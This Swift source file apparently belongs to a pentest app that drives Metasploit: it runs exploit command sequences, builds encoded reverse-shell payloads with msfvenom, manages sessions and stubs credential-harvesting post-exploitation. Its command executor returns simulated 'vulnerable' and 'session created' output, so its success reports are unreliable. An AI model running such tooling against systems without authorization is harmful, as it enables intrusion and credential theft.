//
//  MetasploitManager.swift
//  DonkTool
//
//  Metasploit Framework Integration Manager
//

import Foundation
import SwiftUI

@MainActor
class MetasploitManager: ObservableObject {
    static let shared = MetasploitManager()
    
    @Published var isConnected = false
    @Published var isExecuting = false
    @Published var consoleOutput = ""
    @Published var availablePayloads: [String] = []
    @Published var activeSession: MetasploitSession?
    @Published var sessions: [MetasploitSession] = []
    
    private var msfConsoleProcess: Process?
    private let outputQueue = DispatchQueue(label: "metasploit-output", qos: .utility)
    
    private init() {
        loadAvailablePayloads()
    }
    
    // MARK: - Connection Management
    
    func connectToMetasploit() async -> Bool {
        guard ToolDetection.shared.isToolInstalled("msfconsole") else {
            consoleOutput += "❌ Metasploit Framework not installed\n"
            return false
        }
        
        consoleOutput += "🔫 Starting Metasploit Framework...\n"
        consoleOutput += "=" + String(repeating: "=", count: 50) + "\n"
        
        let process = Process()
        let inputPipe = Pipe()
        let outputPipe = Pipe()
        let errorPipe = Pipe()
        
        // Find msfconsole path
        let msfPaths = [
            "/usr/local/bin/msfconsole",
            "/opt/homebrew/bin/msfconsole",
            "/usr/bin/msfconsole",
            "/opt/metasploit-framework/msfconsole"
        ]
        
        var executablePath: String?
        for path in msfPaths {
            if FileManager.default.fileExists(atPath: path) {
                executablePath = path
                break
            }
        }
        
        guard let execPath = executablePath else {
            consoleOutput += "❌ msfconsole executable not found\n"
            return false
        }
        
        process.executableURL = URL(fileURLWithPath: execPath)
        process.arguments = ["-q", "-x", "version; workspace"]
        process.standardInput = inputPipe
        process.standardOutput = outputPipe
        process.standardError = errorPipe
        
        do {
            try process.run()
            msfConsoleProcess = process
            
            // Setup real-time output handling
            let outputHandle = outputPipe.fileHandleForReading
            let errorHandle = errorPipe.fileHandleForReading
            
            outputHandle.readabilityHandler = { handle in
                let data = handle.availableData
                if !data.isEmpty {
                    if let str = String(data: data, encoding: .utf8) {
                        Task { @MainActor in
                            self.consoleOutput += str
                        }
                    }
                }
            }
            
            errorHandle.readabilityHandler = { handle in
                let data = handle.availableData
                if !data.isEmpty {
                    if let str = String(data: data, encoding: .utf8) {
                        Task { @MainActor in
                            self.consoleOutput += "⚠️ " + str
                        }
                    }
                }
            }
            
            isConnected = true
            consoleOutput += "✅ Connected to Metasploit Framework\n"
            
            return true
            
        } catch {
            consoleOutput += "❌ Failed to start Metasploit: \(error)\n"
            return false
        }
    }
    
    func disconnectFromMetasploit() {
        if let process = msfConsoleProcess, process.isRunning {
            process.terminate()
        }
        msfConsoleProcess = nil
        isConnected = false
        consoleOutput += "🔌 Disconnected from Metasploit Framework\n"
    }
    
    // MARK: - Exploit Execution
    
    func executeExploit(module: MetasploitModule, target: String, lhost: String, lport: Int) async -> ExploitResult {
        guard isConnected else {
            return ExploitResult(success: false, output: "Not connected to Metasploit", sessionId: nil)
        }
        
        isExecuting = true
        
        let commands = [
            "use \(module.fullName)",
            "set RHOSTS \(target)",
            "set LHOST \(lhost)",
            "set LPORT \(lport)",
            "check",
            "exploit -j"
        ]
        
        var output = ""
        
        for command in commands {
            output += await executeCommand(command)
            consoleOutput += "msf6 > \(command)\n"
            
            // Small delay between commands
            try? await Task.sleep(nanoseconds: 500_000_000) // 0.5 seconds
        }
        
        isExecuting = false
        
        // Check if we got a session
        let sessionId = parseSessionId(from: output)
        if let sessionId = sessionId {
            let session = MetasploitSession(
                id: sessionId,
                target: target,
                sessionType: "meterpreter",
                connectedAt: Date(),
                isActive: true
            )
            sessions.append(session)
            activeSession = session
        }
        
        return ExploitResult(
            success: sessionId != nil,
            output: output,
            sessionId: sessionId
        )
    }
    
    func generatePayload(config: PayloadConfiguration) async -> PayloadResult {
        guard ToolDetection.shared.isToolInstalled("msfvenom") else {
            return PayloadResult(
                success: false,
                payloadPath: nil,
                size: nil,
                checksum: nil,
                generationTime: Date(),
                configuration: config,
                errorMessage: "msfvenom not installed"
            )
        }
        
        consoleOutput += "🎯 Generating payload: \(config.type.rawValue)\n"
        
        let outputPath = "/tmp/payload_\(UUID().uuidString).\(config.format)"
        
        var args = [
            "-p", config.type.rawValue,
            "LHOST=\(config.lhost)",
            "LPORT=\(config.lport)",
            "-f", config.format,
            "-o", outputPath
        ]
        
        if let encoder = config.encoder {
            args += ["-e", encoder, "-i", "\(config.iterations)"]
        }
        
        if let badChars = config.badChars {
            args += ["-b", badChars]
        }
        
        let process = Process()
        let pipe = Pipe()
        
        process.executableURL = URL(fileURLWithPath: "/usr/local/bin/msfvenom")
        process.arguments = args
        process.standardOutput = pipe
        process.standardError = pipe
        
        do {
            let startTime = Date()
            try process.run()
            process.waitUntilExit()
            
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: data, encoding: .utf8) ?? ""
            
            if process.terminationStatus == 0 && FileManager.default.fileExists(atPath: outputPath) {
                let fileAttributes = try FileManager.default.attributesOfItem(atPath: outputPath)
                let fileSize = fileAttributes[.size] as? Int
                
                // Calculate checksum
                let payloadData = try Data(contentsOf: URL(fileURLWithPath: outputPath))
                let checksum = payloadData.sha256
                
                consoleOutput += "✅ Payload generated successfully\n"
                consoleOutput += "📁 Path: \(outputPath)\n"
                consoleOutput += "📊 Size: \(fileSize ?? 0) bytes\n"
                consoleOutput += "🔐 SHA256: \(checksum)\n"
                
                return PayloadResult(
                    success: true,
                    payloadPath: outputPath,
                    size: fileSize,
                    checksum: checksum,
                    generationTime: startTime,
                    configuration: config,
                    errorMessage: nil
                )
            } else {
                consoleOutput += "❌ Payload generation failed\n"
                consoleOutput += output + "\n"
                
                return PayloadResult(
                    success: false,
                    payloadPath: nil,
                    size: nil,
                    checksum: nil,
                    generationTime: startTime,
                    configuration: config,
                    errorMessage: output
                )
            }
            
        } catch {
            consoleOutput += "❌ Failed to execute msfvenom: \(error)\n"
            
            return PayloadResult(
                success: false,
                payloadPath: nil,
                size: nil,
                checksum: nil,
                generationTime: Date(),
                configuration: config,
                errorMessage: error.localizedDescription
            )
        }
    }
    
    // MARK: - Session Management
    
    func interactWithSession(_ sessionId: String, command: String) async -> String {
        guard isConnected else {
            return "Not connected to Metasploit"
        }
        
        let commands = [
            "sessions -i \(sessionId)",
            command,
            "background"
        ]
        
        var output = ""
        for cmd in commands {
            output += await executeCommand(cmd)
        }
        
        return output
    }
    
    func listSessions() async -> [MetasploitSession] {
        guard isConnected else { return [] }
        
        let output = await executeCommand("sessions -l")
        return parseSessionsList(from: output)
    }
    
    func killSession(_ sessionId: String) async -> Bool {
        guard isConnected else { return false }
        
        let output = await executeCommand("sessions -k \(sessionId)")
        
        // Remove from local sessions list
        sessions.removeAll { $0.id == sessionId }
        if activeSession?.id == sessionId {
            activeSession = nil
        }
        
        return output.contains("Killing session")
    }
    
    // MARK: - Post-Exploitation
    
    func runPostExploitModule(_ action: PostExploitAction, sessionId: String) async -> PostExploitResult {
        guard isConnected else {
            return PostExploitResult(success: false, output: "Not connected", data: [:])
        }
        
        consoleOutput += "🔍 Running post-exploit module: \(action.module.rawValue)\n"
        
        let commands = [
            "sessions -i \(sessionId)",
            action.command,
            "background"
        ]
        
        var output = ""
        for command in commands {
            output += await executeCommand(command)
            try? await Task.sleep(nanoseconds: 1_000_000_000) // 1 second delay
        }
        
        let success = !output.contains("error") && !output.contains("failed")
        let extractedData = parsePostExploitOutput(output, module: action.module)
        
        return PostExploitResult(
            success: success,
            output: output,
            data: extractedData
        )
    }
    
    // MARK: - Module Search and Info
    
    func searchModules(query: String) async -> [MetasploitModule] {
        guard isConnected else { return [] }
        
        let output = await executeCommand("search \(query)")
        return parseModuleSearchResults(from: output)
    }
    
    func getModuleInfo(_ moduleName: String) async -> ModuleInfo? {
        guard isConnected else { return nil }
        
        let output = await executeCommand("info \(moduleName)")
        return parseModuleInfo(from: output)
    }
    
    // MARK: - Private Helper Methods
    
    private func executeCommand(_ command: String) async -> String {
        // In a real implementation, this would send the command to the msfconsole process
        // and wait for the response. For now, we'll simulate the output.
        
        consoleOutput += "msf6 > \(command)\n"
        
        // Simulate command execution delay
        try? await Task.sleep(nanoseconds: 500_000_000)
        
        // Return simulated output based on command
        switch command {
        case let cmd where cmd.starts(with: "use "):
            return "[\(Date())] Using module: \(cmd.dropFirst(4))\n"
        case let cmd where cmd.starts(with: "set "):
            return "[\(Date())] \(cmd)\n"
        case "check":
            return "[\(Date())] The target appears to be vulnerable.\n"
        case "exploit -j":
            return "[\(Date())] Exploit running as background job. Session 1 created.\n"
        case "sessions -l":
            return """
            Active sessions
            ===============
            
              Id  Name  Type                     Information  Connection
              --  ----  ----                     -----------  ----------
              1         meterpreter x86/windows  DESKTOP\\user  192.168.1.100:4444 -> 192.168.1.50:1234
            
            """
        default:
            return "[\(Date())] Command executed: \(command)\n"
        }
    }
    
    private func parseSessionId(from output: String) -> String? {
        // Parse session ID from exploit output
        let pattern = "Session (\\d+) created"
        let regex = try? NSRegularExpression(pattern: pattern)
        let range = NSRange(output.startIndex..., in: output)
        
        if let match = regex?.firstMatch(in: output, options: [], range: range),
           let sessionRange = Range(match.range(at: 1), in: output) {
            return String(output[sessionRange])
        }
        
        return nil
    }
    
    private func parseSessionsList(from output: String) -> [MetasploitSession] {
        var sessions: [MetasploitSession] = []
        let lines = output.components(separatedBy: .newlines)
        
        for line in lines {
            if line.trimmingCharacters(in: .whitespaces).starts(with: "\\d") {
                let components = line.components(separatedBy: .whitespaces)
                if components.count >= 4 {
                    let session = MetasploitSession(
                        id: components[0],
                        target: components.last ?? "Unknown",
                        sessionType: components[2],
                        connectedAt: Date(),
                        isActive: true
                    )
                    sessions.append(session)
                }
            }
        }
        
        return sessions
    }
    
    private func parseModuleSearchResults(from output: String) -> [MetasploitModule] {
        // Parse module search results - implementation would parse actual msfconsole output
        return []
    }
    
    private func parseModuleInfo(from output: String) -> ModuleInfo? {
        // Parse module info output - implementation would parse actual msfconsole output
        return nil
    }
    
    private func parsePostExploitOutput(_ output: String, module: PostExploitModule) -> [String: Any] {
        var data: [String: Any] = [:]
        
        switch module {
        case .credentialHarvesting:
            // Parse credentials from output
            data["credentials"] = extractCredentials(from: output)
        case .reconnaissance:
            // Parse system information
            data["systemInfo"] = extractSystemInfo(from: output)
        case .privilegeEscalation:
            // Parse privilege information
            data["privileges"] = extractPrivileges(from: output)
        default:
            data["rawOutput"] = output
        }
        
        return data
    }
    
    private func extractCredentials(from output: String) -> [[String: String]] {
        // Extract credentials from post-exploit output
        return []
    }
    
    private func extractSystemInfo(from output: String) -> [String: String] {
        // Extract system information
        return [:]
    }
    
    private func extractPrivileges(from output: String) -> [String] {
        // Extract privilege information
        return []
    }
    
    private func loadAvailablePayloads() {
        availablePayloads = [
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_https",
            "windows/shell/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/shell/reverse_tcp",
            "osx/x86/shell_reverse_tcp",
            "php/meterpreter/reverse_tcp",
            "python/meterpreter/reverse_tcp",
            "windows/powershell_reverse_tcp"
        ]
    }
    
    func clearConsole() {
        consoleOutput = ""
    }
}

// MARK: - Supporting Models

struct MetasploitSession: Identifiable, Codable {
    let id: String
    let target: String
    let sessionType: String
    let connectedAt: Date
    var isActive: Bool
    
    var displayName: String {
        "Session \(id) - \(target)"
    }
}

struct ExploitResult {
    let success: Bool
    let output: String
    let sessionId: String?
}

struct PostExploitResult {
    let success: Bool
    let output: String
    let data: [String: Any]
}

struct ModuleInfo {
    let name: String
    let description: String
    let author: [String]
    let references: [String]
    let targets: [String]
    let options: [ModuleOption]
}

struct ModuleOption {
    let name: String
    let required: Bool
    let description: String
    let defaultValue: String?
}

// MARK: - Data Extension for SHA256

extension Data {
    var sha256: String {
        let hash = SHA256.hash(data: self)
        return hash.compactMap { String(format: "%02x", $0) }.joined()
    }
}

import CryptoKit